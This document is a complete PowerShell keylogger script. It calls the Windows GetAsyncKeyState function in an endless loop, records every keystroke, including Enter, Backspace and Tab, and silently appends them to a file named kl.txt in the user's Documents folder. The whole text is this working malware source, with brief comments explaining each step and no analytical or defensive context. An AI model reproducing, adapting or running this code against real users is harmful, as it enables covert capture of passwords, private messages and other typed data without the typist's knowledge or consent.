# Define the log file path in the Documents folder
$DocPath = [Environment]::GetFolderPath("MyDocuments")
$LogPath = Join-Path $DocPath "kl.txt"

# Import user32.dll to access the GetAsyncKeyState function
$Signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

$API = Add-Type -MemberDefinition $Signatures -Name 'Win32' -Namespace API -PassThru

# Start the logging loop
while ($true) {
    Start-Sleep -Milliseconds 40  # Reduces CPU overhead

    # Iterate through standard ASCII/Virtual Key codes (8 to 254)
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $KeyState = $API::GetAsyncKeyState($ascii)

        # -32767 indicates the key was pressed since the last call
        if ($KeyState -eq -32767) {
            $key = [char]$ascii

            # Handle special keys for better readability
            switch ($ascii) {
                13 { $key = "`r`n[ENTER]`r`n" }
                32 { $key = " " }
                8  { $key = "[BACKSPACE]" }
                9  { $key = "[TAB]" }
            }

            # Append the key to the log file
            $key | Out-File -FilePath $LogPath -Append -NoNewline
        }
    }
}